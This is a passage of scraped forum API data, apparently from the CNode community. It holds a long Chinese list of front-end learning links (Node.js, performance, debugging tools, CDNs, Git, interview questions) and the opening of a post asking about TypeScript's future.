href=\"http://www.cnblogs.com/zhongweiv/p/nodejs_events.html\">Nodejs学习笔记（二）— 事件模块</a></li>\n<li><a href=\"http://www.cnblogs.com/liusuqi/p/3735491.html\">nodejs入门</a></li>\n<li><a href=\"https://github.com/zensh/jsgen\">angularjs nodejs</a></li>\n<li><a href=\"http://blog.fens.me/series-nodejs/\">从零开始nodejs系列文章</a></li>\n<li><a href=\"http://debuggable.com/posts/understanding-node-js:4bd98440-45e4-4a9a-8ef7-0f7ecbdd56cb\">理解nodejs</a></li>\n<li><a href=\"http://blog.mixu.net/2011/02/01/understanding-the-node-js-event-loop/\">nodejs事件轮询</a></li>\n<li><a href=\"http://www.nodebeginner.org/index-zh-cn.html\">node入门</a></li>\n<li><a href=\"http://ourjs.com/detail/53e1f281c5910a9806000001\">nodejs cms</a></li>\n<li><a href=\"http://ourjs.com/detail/529ca5950cb6498814000005\">Node初学者入门，一本全面的NodeJS教程</a></li>\n<li><a href=\"http://www.barretlee.com/blog/2015/10/07/debug-nodejs-in-command-line/\">NodeJS的代码调试和性能调优</a></li>\n</ul>\n<h3>十. 性能优化</h3>\n<ol>\n<li>\n<p>常规优化</p>\n<ul>\n<li><a href=\"http://www.infoq.com/cn/articles/javascript-high-performance-animation-and-page-rendering\">Javascript高性能动画与页面渲染</a></li>\n<li><a href=\"http://isux.tencent.com/h5-performance.html\">移动H5前端性能优化指南</a></li>\n<li><a href=\"http://ued.5173.com/?p=1731\">5173首页前端性能优化实践</a></li>\n<li><a href=\"http://www.uisdc.com/front-end-performance-for-web-designers-and-front-end-developers\">给网页设计师和前端开发者看的前端性能优化</a></li>\n<li><a href=\"http://www.orzpoint.com/profiling-css-and-optimization-notes/\">复杂应用的 CSS 性能分析和优化建议</a></li>\n<li><a href=\"http://www.zhangxinxu.com/wordpress/tag/%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD/\">张鑫旭——前端性能</a></li>\n<li><a href=\"http://www.xiaoqiang.org/javascript/font-end-performance-monitor.html\">前端性能监控总结</a></li>\n<li><a href=\"http://udc.weibo.com/2013/05/%E7%BD%91%E7%AB%99%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E4%B9%8Bcss%E6%97%A0%E5%9B%BE%E7%89%87%E6%8A%80%E6%9C%AF/\">网站性能优化之CSS无图片技术</a></li>\n<li><a href=\"http://www.aliued.cn/2013/01/20/web%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E8%BF%9B%E9%98%B6%E8%B7%AF.html\">web前端性能优化进阶路</a></li>\n<li><a href=\"http://my.eoe.cn/tuwandou/archive/4544.html\">前端技术：网站性能优化之CSS无图片技术</a></li>\n<li><a href=\"http://www.baiduux.com/blog/2011/02/15/browser-loading/\">浏览器的加载与页面性能优化</a></li>\n<li><a href=\"http://www.w3ctech.com/p/1503\">页面加载中的图片性能优化</a></li>\n<li><a href=\"http://www.feelcss.com/tag/%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD\">Hey——前端性能</a></li>\n<li><a href=\"http://www.baiduux.com/blog/2010/03/15/html%E4%BC%98%E5%8C%96-2/\">html优化</a></li>\n<li><a href=\"http://www.99css.com/tag/%e6%80%a7%e8%83%bd\">99css——性能</a></li>\n<li><a href=\"http://www.yslow.net/category.php?cid=20\">Yslow——性能优化</a></li>\n<li><a href=\"http://www.cnblogs.com/yslow/\">YSLOW中文介绍</a></li>\n<li><a href=\"http://www.360ito.com/article/40.html\">转一篇Yahoo关于网站性能优化的文章，兼谈本站要做的优化</a></li>\n<li><a href=\"http://www.360doc.com/content/10/0928/09/2588264_56971287.shtml\">Yahoo!团队实践分享：网站性能</a></li>\n<li><a href=\"http://blog.jiasule.com/i/153\">网站性能优化指南：什么使我们的网站变慢？</a></li>\n<li><a href=\"http://www.powereasy.net/helpyou/knowledge/ecommerce/9593.html\">网站性能优化实践，减少加载时间，提高用户体验</a></li>\n<li><a href=\"http://www.umtry.com/archives/747.html\">浅谈网站性能优化 前端篇</a></li>\n<li><a href=\"http://www.adinnet.cn/blog/designview/2012-7-12/678.html\">前端重构实践之如何对网站性能优化？</a></li>\n<li><a href=\"http://www.gbin1.com/technology/javascript/20130708-front-end-performance-optimization-9/\">前端性能优化：使用媒体查询加载指定大小的背景图片</a></li>\n<li><a href=\"http://www.mykuer.com/post/factors-that-affect-the-speed-of-web-site-open.html\">网站性能系列博文</a></li>\n<li><a href=\"http://tgideas.qq.com/webplat/info/news_version3/804/808/811/m579/201109/41355.shtml\">加载，不只是少一点点</a></li>\n<li><a href=\"http://mzhou.me/article/95310/\">前端性能的测试与优化</a></li>\n<li><a href=\"http://www.gbin1.com/technology/html/20130217-tips-for-speed-up-page-loading/\">分享网页加载速度优化的一些技巧？</a></li>\n<li><a href=\"http://www.f2es.com/images-bytes-opt/\">页面加载中的图片性能优化</a></li>\n<li><a href=\"http://www.tcreator.info/webSchool/website/Front-end-Opt-Yslow.html\">web前端优化(基于Yslow)</a></li>\n<li><a href=\"https://www.qianduan.net/website-performance-optimization-tool.html\">网站性能优化工具大全</a></li>\n<li><a href=\"http://www.alloyteam.com/2012/10/high-performance-html/\">【高性能前端1】高性能HTML</a></li>\n<li><a href=\"http://www.alloyteam.com/2012/10/high-performance-css/\">【高性能前端2】高性能CSS</a></li>\n<li><a href=\"http://coolshell.cn/articles/6470.html\">由12306谈谈网站前端性能和后端性能优化</a></li>\n<li><a href=\"http://www.alloyteam.com/webfrontend/%E5%89%8D%E7%AB%AF%E4%BC%98%E5%8C%96/\">AlloyTeam——前端优化</a></li>\n<li><a href=\"http://www.cnblogs.com/developersupport/p/3248695.html\">毫秒必争，前端网页性能最佳实践</a></li>\n<li><a href=\"http://blog.sina.com.cn/s/blog_6e9d2e0701017kvu.html\">网站性能工具Yslow的使用方法</a></li>\n<li><a href=\"http://www.infoq.com/cn/articles/front-end-engineering-and-performance-optimization-part1\">前端工程与性能优化（上）：静态资源版本更新与缓存</a></li>\n<li><a href=\"http://www.infoq.com/cn/articles/front-end-engineering-and-performance-optimization-part2\">前端工程与性能优化（下）：静态资源管理与模板框架</a></li>\n<li><a href=\"http://blog.jobbole.com/48369/\">HTTPS连接的前几毫秒发生了什么</a></li>\n<li><a href=\"http://uicss.cn/yslow/#more-12319\">Yslow</a></li>\n<li><a href=\"http://blog.smartbear.com/web-performance/essential-web-performance-metrics-a-primer-part-1/\">Essential Web Performance Metrics — A Primer, Part 1</a></li>\n<li><a href=\"http://blog.smartbear.com/performance/essential-web-performance-metrics-part-2/\">Essential Web Performance Metrics — Part 2</a></li>\n<li><a href=\"http://jayli.github.io/blog/data/2011/12/23/yuislide.html\">YUISlide,针对移动设备的动画性能优化</a></li>\n<li><a href=\"http://joelglovier.com/improving-site-performance/\">Improving Site Performance</a></li>\n<li><a href=\"http://segmentfault.com/a/1190000000367899\">让网站提速的最佳前端实践</a></li>\n<li><a href=\"http://sixrevisions.com/web-development/why-website-speed-is-important/\">Why Website Speed is Important</a></li>\n<li><a href=\"https://www.devbridge.com/articles/need-for-speed-how-to-improve-your-website-performance/\">Need for Speed – How to Improve your Website Performance</a></li>\n<li><a href=\"https://github.com/amfe/article/issues/1\">阿里无线前端性能优化指南 (Pt.1 加载期优化) </a></li>\n<li><a href></a></li>\n</ul>\n</li>\n<li>\n<p>优化工具</p>\n<ul>\n<li><a href=\"http://www.html-js.com/article/3083\">JavaScript 性能分析新工具 OneProfile</a></li>\n<li><a href=\"http://www.html-js.com/article/3091\">JavaScript 堆内存分析新工具 OneHeap</a></li>\n</ul>\n</li>\n<li>\n<p>在线工具</p>\n<ul>\n<li><a href=\"https://developers.google.com/speed/pagespeed/insights/\">google在线工具</a></li>\n<li><a href=\"http://www.alibench.com/\">阿里测</a></li>\n<li><a href=\"http://itest.aliyun.com/\">阿里-免费测试服务</a></li>\n<li><a href=\"https://github.com/alibaba/f2etest\">阿里-F2etest多浏览器兼容性测试解决方案</a></li>\n<li><a href=\"http://jsperf.com/\">js性能测试</a></li>\n<li><a href></a></li>\n</ul>\n</li>\n</ol>\n<h3>十一. 前端架构</h3>\n<ul>\n<li><a href=\"http://www.zhihu.com/topic/19612641\">技术架构</a></li>\n<li><a href=\"http://saito.im/note/The-Architecture-of-F2E/\">前端架构</a></li>\n<li><a href=\"http://www.zhihu.com/question/24092572\">如何成为前端架构师</a></li>\n<li><a href=\"http://hikejun.com/sharing/2010webrebuild/?file=fe-infrastructure.html\">关于前端架构-张克军</a></li>\n<li><a href=\"http://www.zhihu.com/question/25583350\">百度腾讯offer比较（腾讯游戏VS百度基础架构）</a></li>\n<li><a href></a></li>\n</ul>\n<h3>十二. 个人作品</h3>\n<h4>1. 推荐作品</h4>\n<ul>\n<li><a href=\"https://gist.github.com/wintercn\">winter代码片段需要翻墙</a></li>\n<li><a href=\"http://www.fgm.cc/learn/\">fgm</a></li>\n<li><a href=\"https://github.com/hongru/hongru.github.com\">岑安作品集</a></li>\n<li><a href=\"http://kmdjs.github.io/\">当耐特demo集合</a></li>\n<li><a href=\"http://www.laoshu133.com/Lab/\">米空格 js作品</a></li>\n<li><a href=\"http://koen301.github.io/\">myFocus</a></li>\n<li><a href=\"http://panxuepeng.github.io/seajslib/\">SeaJS组件库</a></li>\n<li><a href=\"http://yanhaijing.com/myProject/\">颜海镜作品</a></li>\n<li><a href=\"http://jo2.org/category/myworks/\">脚儿网作品</a></li>\n<li><a href=\"http://www.cnitblog.com/yemoo/category/3107.html\">javascript个人作品</a></li>\n<li><a href=\"http://bbs.miaov.com/forum.php?mod=viewthread&amp;tid=7790\">妙味的雷东升游戏作品</a></li>\n<li><a href=\"http://bbs.csdn.net/topics/380227212\">javascript作品集</a></li>\n<li><a href=\"https://github.com/TooBug/works\">云五笔，灰度产生生成工具</a></li>\n<li><a href=\"http://koen301.github.io/\">项目主页</a></li>\n<li><a href=\"http://zaole.net/\">个性的作品主页</a></li>\n<li><a href=\"http://static.tingall.com/v2/player/\">播放器</a></li>\n<li><a href=\"http://ucren.com/blog/demos\">ucren js demos 集</a></li>\n<li><a href=\"http://www.zhinengshe.com/works_list.html\">智能社</a></li>\n<li><a href=\"http://demos.shizuwu.cn/\">实例陈列架</a></li>\n<li><a href=\"http://zoye.sinaapp.com/demo\">zoye demo</a></li>\n<li><a href=\"http://lab.yuanwai.wang/\">王员外</a></li>\n<li><a href=\"http://pingfan1990.sinaapp.com\">平凡</a></li>\n<li><a href=\"http://www.lovewebgames.com/\">jyg 游戏案例</a></li>\n<li><a href=\"http://www.helloweba.com/list.html\">很多jquery插件</a></li>\n<li><a href=\"http://www.bujichong.com/sojs/api/index.html\">不羁虫 - soJs 作品系列</a></li>\n<li><a href=\"http://frozenui.github.io/case.html\">frozenui</a></li>\n<li><a href=\"http://js-game.github.io/othello/\">黑白棋</a></li>\n<li><a href=\"http://yansm.github.io/fromone/index.html\">fromone</a></li>\n</ul>\n<h4>2. 群员作品</h4>\n<ul>\n<li><a href=\"http://demo.webjyh.com/\">MDialog - [合肥-M.J]</a></li>\n<li><a href=\"http://sandbox.runjs.cn/show/do6zlrrk\">轮播图 - [上海－冷静]</a></li>\n<li><a href=\"http://www.replace5.com/\">[广州—坚壳]</a></li>\n<li><a href=\"http://www.seejs.com/demos/\">[成都 - 无痕]　感恩节专题</a></li>\n<li><a href=\"http://hacke2.github.io/works\">[球霸天]</a></li>\n<li><a href=\"http://www.cnblogs.com/mcat/\">[北京-小数]</a></li>\n<li><a href=\"http://thx.github.io/magix/\">[ptf] Magix 工具</a></li>\n<li><a href=\"http://thx.github.io/magix/\">[杭州-Pft] Magix 基于 MVC 结构和 Hash 驱动的 OPOA（One Page One Application）应用</a></li>\n<li><a href=\"http://bh-lay.com/labs/\">[上海-剧中人]-实验室</a></li>\n<li><a href=\"http://jikeytang.github.io\">[上海-豪情 ] 作品集合</a></li>\n<li><a href=\"http://guoshan.sinaapp.com/\">[成都-feeling]</a></li>\n<li><a href=\"http://www.cnblogs.com/liyunhua/\">[上海-angela]</a></li>\n<li><a href=\"http://hcjp.github.io/work/demo/\">[海南-hank]作品</a></li>\n<li><a href=\"https://github.com/yibuyisheng/blogs/issues\">[上海-张力]博客</a></li>\n<li><a href=\"http://zkske121.github.io/\">[上海-zenki]作品</a></li>\n<li><a href=\"http://01google.sinaapp.com/locker.html\">移动端图案解锁</a></li>\n<li><a href=\"https://github.com/webjyh/MPreview.mobile\">[合肥-M.J] - MPreview 移动端图片预览组</a></li>\n<li><a href=\"https://github.com/webjyh/Mexam\">[合肥-M.J] - Mexam 移动端在线做题组</a></li>\n<li><a href=\"http://letyougo.github.io/dancer/\">[北京-苏瑞] - dancer小人</a></li>\n<li><a href=\"http://k.swao.cn/js/\">[上海-玄沐]- 个人网站</a></li>\n<li><a href=\"http://www.meckodo.com/\">[厦门-二哲]- 个人博客</a></li>\n</ul>\n<h4>3. 国外大牛精品</h4>\n<ul>\n<li><a href=\"http://pazguille.me/\">pazguille</a></li>\n</ul>\n<h3>十三. 简历模板</h3>\n<ul>\n<li><a href=\"http://learnshare.github.io/about/index.html\">不错的个人简历</a></li>\n<li><a href=\"http://hcy2367.github.io/resume/\">简历</a></li>\n<li><a href=\"http://ncuey.sinaapp.com/CrispElite/\">张伦</a></li>\n<li><a href=\"https://github.com/hacke2/ResumeSample\">简历</a></li>\n<li><a href=\"http://blog.dandyweng.com/2013/07/how-my-website-was-created/\">翁天信</a></li>\n<li><a href=\"http://www.webhek.com/misc/interactive-resume/\">动画方式的简历</a></li>\n<li><a href=\"http://www.linqing07.com/resume.html\">组件丰富简历</a></li>\n<li><a href=\"http://www.mojianli.com/resume/view\">简历池</a></li>\n<li><a href=\"http://www.haorooms.com/about\">haorooms博客</a></li>\n<li><a href=\"http://cv.youngdze.com/\">Justin Young</a></li>\n<li><a href></a></li>\n</ul>\n<h3>十四. 面试题</h3>\n<ul>\n<li><a href=\"http://www.nowcoder.com/discuss/3196\">那几个月在找工作（百度，网易游戏）</a></li>\n<li><a href=\"http://www.html-js.com/article/1743\">2014最新面试题</a></li>\n<li><a href=\"http://www.w3cfuns.com/thread-5598563-2-1.html\">阿里前端面试题</a></li>\n<li><a href=\"http://www.cnblogs.com/imwtr/p/4685546.html\">2016校招内推 – 阿里巴巴前端 – 三面面试经历 </a></li>\n<li><a href=\"http://www.w3cfuns.com/article-5599657-1-1.html\">腾讯面试题</a></li>\n<li><a href=\"http://www.cnblogs.com/lvdabao/p/3660707.html\">年后跳槽那点事：乐视+金山+360面试之行</a></li>\n<li><a href=\"http://fatesinger.com/2722.html\">阿里前端面试题上线</a></li>\n<li><a href=\"http://www.cnblogs.com/52cik/p/js-question-lg.html\">拉勾网js面试题</a></li>\n<li><a href=\"http://www.cnblogs.com/allenxing/p/3724382.html\">前端面试</a></li>\n<li><a href=\"http://mianshiti.diandian.com/\">Web开发笔试面试题 大全</a></li>\n<li><a href=\"http://segmentfault.com/a/1190000000465431\">前端开发面试题</a></li>\n<li><a href=\"https://github.com/markyun/My-blog/tree/master/Front-end-Developer-Questions\">2014最新前端面试题</a></li>\n<li><a href=\"https://github.com/fex-team/interview-questions\">百度面试</a></li>\n<li><a href=\"http://www.w3cfuns.com/forum.php?mod=forumdisplay&amp;fid=51&amp;filter=typeid&amp;typeid=177\">面试题</a></li>\n<li><a href=\"https://github.com/darcyclarke/Front-end-Developer-Interview-Questions/tree/master/Chinese\">前端工作面试问题</a></li>\n<li><a href=\"http://segmentfault.com/a/1190000000465431\">前端开发面试题</a></li>\n<li><a href=\"http://ourjs.com/detail/5%E4%B8%AA%E7%BB%8F%E5%85%B8%E7%9A%84%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98\">5个经典的前端面试问题</a></li>\n<li><a href=\"http://segmentfault.com/a/1190000002562454\">最全前端面试问题及答案总结 </a></li>\n<li><a href=\"http://www.html-js.com/article/Large-search-front-team-column%202961\">如何面试一名前端开发工程师？</a></li>\n<li><a href=\"https://github.com/hawx1993/Front-end-Interview-questions\">史上最全 前端开发面试问题及答案整理</a></li>\n<li><a href=\"http://www.cnblogs.com/xiaoruo/p/4665163.html\">前端实习生面试总结 </a></li>\n<li><a href=\"https://github.com/hawx1993/Front-end-Interview-questions\">史上最全 前端开发面试问题及答案整理</a></li>\n<li><a href=\"http://blog.jobbole.com/78738/\">BAT及各大互联网公司2014前端笔试面试题：JavaScript篇</a></li>\n<li><a href=\"https://github.com/paddingme/Front-end-Web-Development-Interview-Question\">前端开发面试题大收集</a></li>\n<li><a href=\"https://github.com/qiu-deqing/FE-interview\">收集的前端面试题和答案</a></li>\n<li><a href=\"http://www.zhihu.com/question/19568008\">如何面试前端工程师</a></li>\n<li><a href=\"https://github.com/markyun/My-blog/blob/master/Front-end-Developer-Questions/Questions-and-Answers/README.md\">前端开发面试题</a></li>\n<li><a href=\"http://www.nowcoder.com/discuss?type=2\">牛客网-笔试面经</a></li>\n</ul>\n<h3>十五. iconfont</h3>\n<ul>\n<li><a href=\"http://www.zhihu.com/question/21253343\">中文字体</a></li>\n<li><a href=\"http://iconfont.cn\">淘宝字库</a></li>\n<li><a href=\"http://mux.alimama.com/fonts\">字体</a></li>\n<li><a href=\"http://iconfont.cn/help/platform.html\">制作教程</a></li>\n<li><a href=\"http://www.zhangxinxu.com/wordpress/?s=icomoon\">zhangxinxu-icommon</a></li>\n<li><a href=\"https://icomoon.io/app/\">icommon</a></li>\n<li><a href=\"http://imooc.com/learn/243\">用字体在网页中画ICON图标(推荐教程)</a></li>\n<li><a href=\"http://font-spider.org/\">字体压缩工具</a> 感谢初级群　[深圳-小鱼] 的推荐</li>\n</ul>\n<h3>十六. 开发工具类</h3>\n<ol>\n<li>\n<p>前端开发工具</p>\n<ul>\n<li><a href=\"https://github.com/judasn/IntelliJ-IDEA-Tutorial\">IntelliJ IDEA 简体中文专题教程</a></li>\n<li><a href=\"http://t.cn/8kZZ1Uy\">Webstorm,InterllIdea,Phpstorm</a></li>\n<li><a href=\"https://github.com/jikeytang/sublime-text\">SublimeText</a></li>\n<li><a href=\"https://atom.io/\">Atom</a></li>\n<li><a href=\"https://code.visualstudio.com/\">visual studio code</a></li>\n</ul>\n</li>\n<li>\n<p>Chrome, Firebug, Filddle 调试</p>\n<ol>\n<li>\n<p>Fiddler</p>\n<ul>\n<li><a href=\"http://www.cnblogs.com/tugenhua0707/p/4623317.html\">Fiddler调式使用知多少(一)深入研究</a></li>\n<li><a href=\"http://www.cnblogs.com/strick/p/4570006.html\">微信fiddle</a></li>\n<li><a href=\"http://gaoboy.com/article/26.html\">微信fiddle</a></li>\n<li><a href></a></li>\n</ul>\n</li>\n<li>\n<p>Chrome</p>\n<ul>\n<li><a href=\"https://developer.chrome.com/devtools\">Google Chrome 官方</a></li>\n<li><a href=\"http://www.cnblogs.com/constantince/p/4565261.html\">Chrome - 基础</a></li>\n<li><a href=\"http://www.cnblogs.com/constantince/p/4579121.html\">Chrome - 进阶</a></li>\n<li><a href=\"http://www.cnblogs.com/constantince/p/4585983.html\">Chrome - 性能</a></li>\n<li><a href=\"http://www.cnblogs.com/constantince/p/4607497.html\">Chrome - 性能进阶</a></li>\n<li><a href=\"http://www.cnblogs.com/constantince/p/4624241.html\">Chrome - 移动</a></li>\n<li><a href=\"http://www.cnblogs.com/liyunhua/p/4544738.html\">Chrome - 使用技巧</a></li>\n<li><a href=\"http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html\">Chrome - Console控制台不完全指南</a></li>\n<li><a href=\"http://c7sky.com/chrome-devtools-workspace.html\">Chrome - Workspace使浏览器变成IDE</a></li>\n<li><a href=\"http://www.html-js.com/article/Nothing-blind%202975\">network面板</a></li>\n<li><a href=\"http://anti-code.com/devtools-cheatsheet/\">chrome开发工具快捷键</a></li>\n<li><a href=\"http://www.html-js.com/article/2327\">chrome调试工具常用功能整理</a></li>\n<li><a href=\"http://www.iinterest.net/2014/05/09/chrome-dev-tool-workspace/\">Chrome 开发工具 Workspace 使用</a></li>\n<li><a href=\"http://www.cppblog.com/deercoder/archive/2011/10/22/158886.html\">Chrome神器Vimium快捷键学习记录 </a></li>\n<li><a href=\"http://www.w3cplus.com/sassguide/debug.html\">sass调试-w3cplus</a></li>\n<li><a href=\"http://www.w3cplus.com/tools/how-to-use-chrome-devtools-like-a-pro.html\">如何更专业的使用Chrome开发者工具-w3cplus</a></li>\n<li><a href=\"http://sentsin.com/web/253.html\">chrome调试canvas</a></li>\n<li><a href=\"https://developer.chrome.com/devtools/index\">chrome profiles1</a></li>\n<li><a href=\"http://h5dev.uc.cn/article-25-1.html\">chrome profiles2</a></li>\n<li><a href=\"http://www.oschina.net/translate/performance-optimisation-with-timeline-profiles\">chrome profiles3</a></li>\n<li><a href=\"https://developer.chrome.com/devtools/docs/mobile-emulation\">chrome移动版调试</a></li>\n<li><a href=\"http://ued.taobao.org/blog/2012/06/debug-with-chrome-dev-tool/\">chrome调试</a></li>\n<li><a href=\"http://www.cnblogs.com/QLeelulu/archive/2011/08/28/2156402.html\">chrome的调试</a></li>\n<li><a href=\"https://developer.chrome.com/devtools/docs/commandline-api\">chrome console 命令详解</a></li>\n<li><a href=\"http://www.cnblogs.com/leonkao/p/3809655.html\">查看事件绑定1</a></li>\n<li><a href=\"http://www.cnblogs.com/xiaoyao2011/p/3447421.html\">查看事件绑定2</a></li>\n<li><a href=\"http://segmentfault.com/a/1190000000683599\">神器——Chrome开发者工具(一)</a></li>\n<li><a href=\"https://xinranliu.me/2015-05-22-qiqu-performance/\">奇趣百科性能优化(Chrome DevTools 中的 Timeline Profils 等工具使用介绍)</a></li>\n<li><a href=\"http://frontenddev.org/link/15-tips-of-chrome-developer-tools.html\">chrome 开发者工具的 15 个小技巧</a></li>\n<li><a href=\"http://1ke.co/course/361\">Chrome开发者工具不完全指南</a></li>\n<li><a href=\"http://segmentfault.com/a/1190000003882567\">Chrome 开发者工具使用技巧</a></li>\n</ul>\n</li>\n<li>\n<p>Firebug</p>\n<ul>\n<li><a href=\"http://www.imooc.com/learn/137\">firebug视频教程</a></li>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Tools/WebIDE\">firefox 模拟器</a></li>\n<li><a href=\"http://www.cnblogs.com/ctriphire/p/4116207.html\">console.log 命令详解</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2008/06/firebug_tutorial.html\">Firebug入门指南</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2011/03/firebug_console_tutorial.html\">Firebug控制台详解</a></li>\n<li><a href></a></li>\n</ul>\n</li>\n<li>\n<p>移动,微信调试</p>\n<ul>\n<li><a href=\"https://openstf.github.io/\">浏览器端调试安卓</a></li>\n<li><a href=\"http://yujiangshui.com/multidevice-frontend-debug/\">移动端前端开发调试</a></li>\n<li><a href=\"https://github.com/yujiangshui/CN-Chrome-DevTools/blob/remote-debugging/md/Use-Tools/remote-debugging.md\">使用 Chrome 远程调试 Android 设备</a></li>\n<li><a href=\"http://plus.uc.cn/document/webapp/doc5.html\">mac移动端调试</a></li>\n<li><a href=\"http://www.mihtool.com/\">mac移动端调试</a></li>\n<li><a href=\"http://thx.github.io/mobile/debugging-in-mobile/\">无线调试攻略</a></li>\n<li><a href=\"http://yanhaijing.com/mobile/2014/12/17/web-debug-for-mobile/\">无线调试攻略</a></li>\n<li><a href=\"http://www.jianshu.com/p/ccf124f1f74b\">屌爆了,完美调试 微信webview(x5)</a></li>\n<li><a href=\"http://liyaodong.com/2015/07/06/%E5%BE%AE%E4%BF%A1%E8%B0%83%E8%AF%95%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/\">微信调试的那些事</a></li>\n<li><a href=\"http://jsconsole.com/\">远程console</a></li>\n<li><a href=\"http://blog.qqbrowser.cc/\">微信调试工具</a></li>\n<li><a href=\"https://github.com/jieyou/remote_inspect_web_on_real_device\">各种真机远程调试方法汇总</a></li>\n</ul>\n</li>\n<li>\n<p>iOS Simulator</p>\n<ul>\n<li><a href=\"https://developer.apple.com/library/ios/documentation/IDEs/Conceptual/iOS_Simulator_Guide/Introduction/Introduction.html\">Simulator</a></li>\n<li><a href=\"http://www.crifan.com/intro_ios_simulator_in_xcode_and_usage_summary/\">Xcode中的iOS模拟器(iOS Simulator)的介绍和使用心得</a></li>\n</ul>\n</li>\n</ol>\n</li>\n<li>\n<p>img</p>\n<ul>\n<li><a href=\"http://preloaders.net/en/circular\">loading img</a></li>\n<li><a href=\"http://zhitu.isux.us/\">智图-图片优化平台</a></li>\n<li><a href=\"https://tinypng.com/\">在线png优化</a></li>\n</ul>\n</li>\n<li>\n<p>生成二维码</p>\n<ul>\n<li><a href=\"http://cli.im/\">生成二维码</a></li>\n</ul>\n</li>\n<li>\n<p>浏览器同步</p>\n<ul>\n<li><a href=\"https://github.com/leeluolee/puer\">puer</a></li>\n<li><a href=\"http://livereload.com/\">liveReload</a></li>\n<li><a href=\"http://getf5.com/\">f5</a></li>\n<li><a href=\"http://geek100.com/2608/\">File Watchers</a></li>\n</ul>\n</li>\n<li>\n<p>在线PPT制作</p>\n<ul>\n<li><a href=\"http://js8.in/2013/11/16/%E6%8E%A8%E8%8D%90nodeppt%EF%BC%9A%E4%BD%BF%E7%94%A8markdown%E8%AF%AD%E6%B3%95%E6%9D%A5%E5%86%99%E7%BD%91%E9%A1%B5ppt/\">nodePPT</a></li>\n<li><a href=\"https://github.com/ksky521/nodePPT\">PPT</a></li>\n<li><a href=\"https://github.com/hakimel/reveal.js/\">reveal</a></li>\n<li><a href=\"https://github.com/Seldaek/slippy\">slippy</a></li>\n</ul>\n</li>\n</ol>\n<h3>十七. 前端导航网站</h3>\n<ul>\n<li><a href=\"http://uxbees.com/index.html\">界面清爽的前端导航</a></li>\n<li><a href=\"http://whycss.com/\">前端导航</a></li>\n<li><a href=\"http://www.daqianduan.com/nav\">前端网址导航</a></li>\n<li><a href=\"http://sentsin.com/daohang/\">前端名录</a></li>\n<li><a href=\"http://123.jser.us/\">前端导航</a></li>\n<li><a href=\"http://www.css88.com/nav/\">前端开发资源</a></li>\n<li><a href=\"http://www.haourl.cn/\">网址导航</a></li>\n<li><a href=\"http://code.ciaoca.com/\">前端开发仓库 - 众多效果的收集地</a></li>\n<li><a href=\"https://github.com/jnoodle/f2e-collect\">前端资源导航</a></li>\n<li><a href=\"http://f2e.im/static/pages/nav/index.html\">F2E 前端导航</a></li>\n</ul>\n<h3>十八. 常用CDN</h3>\n<ul>\n<li><a href=\"http://lib.sinaapp.com/\">新浪CDN</a></li>\n<li><a href=\"http://cdn.code.baidu.com/\">百度静态资源公共库</a></li>\n<li><a href=\"http://libs.useso.com/\">360网站卫士常用前端公共库CDN服务</a></li>\n<li><a href=\"http://www.bootcdn.cn/\">Bootstrap中文网开源项目免费 CDN 服务</a></li>\n<li><a href=\"http://staticfile.org/\">开放静态文件 CDN - 七牛</a></li>\n<li><a href=\"http://www.jq22.com/cdn/\">CDN加速 - jq22</a></li>\n<li><a href=\"http://code.jquery.com/\">jQuery CDN</a></li>\n<li><a href=\"http://www.google-jquery-cdn.com/\">Google jQuery CDN</a></li>\n<li><a href=\"http://www.asp.net/ajax/cdn\">微软CDN</a></li>\n</ul>\n<h3>十九. Git,SVN,Github</h3>\n<ol>\n<li>\n<p>Git</p>\n<ul>\n<li><a href=\"http://git-scm.com/\">git-scm</a></li>\n<li><a href=\"http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000\">廖雪峰-Git教程</a></li>\n<li><a href=\"https://git-for-windows.github.io/\">git-for-windows</a></li>\n<li><a href=\"http://daemon369.github.io/git/2015/03/10/add-ssh-keys-for-github/\">GitHub 添加 SSH keys</a></li>\n<li><a href=\"http://www.worldhello.net/gotgithub/index.html\">gogithub</a></li>\n<li><a href=\"http://pcottle.github.io/learnGitBranching/\">git常规命令练习</a></li>\n<li><a href=\"https://github.com/xirong/my-git\">git的资料整理</a></li>\n<li><a href=\"http://www.cnblogs.com/fanfan259/p/4810517.html\">我所记录的git命令（非常实用）</a></li>\n<li><a href=\"https://github.com/xirong/my-git/blob/master/git-workflow-tutorial.md\">企业开发git工作流模式探索部分休整</a></li>\n<li><a href=\"https://github.com/phodal/github-roam\">GitHub 漫游指南</a></li>\n<li><a href=\"https://github.com/tiimgreen/github-cheat-sheet/blob/master/README.zh-cn.md\">GitHub秘籍</a></li>\n<li><a href=\"http://livoras.com/post/28\">使用git和github进行协同开发流程</a></li>\n<li><a href=\"http://onlywei.github.io/explain-git-with-d3/\">动画方式练习git</a></li>\n</ul>\n</li>\n</ol>\n<p>联系我，更多交流</p>\n<p><img src=\"//static.cnodejs.org/FrCbjyzuNmHF1u3j8t26t-cGWPnB\" alt=\"xiaoweiquan.jpeg\"></p>\n</div>","title":"前端资源教程","last_reply_at":"2019-01-25T07:49:24.479Z","good":true,"top":false,"reply_count":171,"visit_count":184898,"create_at":"2016-03-21T00:22:53.158Z","author":{"loginname":"i5ting","avatar_url":"https://avatars3.githubusercontent.com/u/3118295?v=4&s=120"}},{"id":"5c35d8563898674067a7d477","author_id":"5b376dfcac8bc1e124114500","tab":"ask","content":"<div class=\"markdown-text\"><p>回顾了一下过去的一年发现 Typescript 在诸多的鄙视中逐渐成长。\n比如 Deno 项目的出现，和 vue 3.0 将拥抱 ts。\n在事业里也发现很多公司的新项目用 typescript 的几率越来越大。</p>\n<p>（不得不承认我以前也是鄙视 TS 的一员，在使用了一段时间的 TS 后感觉还是挺不错的找到了当年写 Java 的感觉，但比起 TS 更支持原生的 JS）</p>\n<h2>在你的项目中有没有用过 TS？ 感觉 TS 是大势所趋还是昙花一现？ 对 TS 未来有什么看法？</h2>\n</div>","title":"Typescript 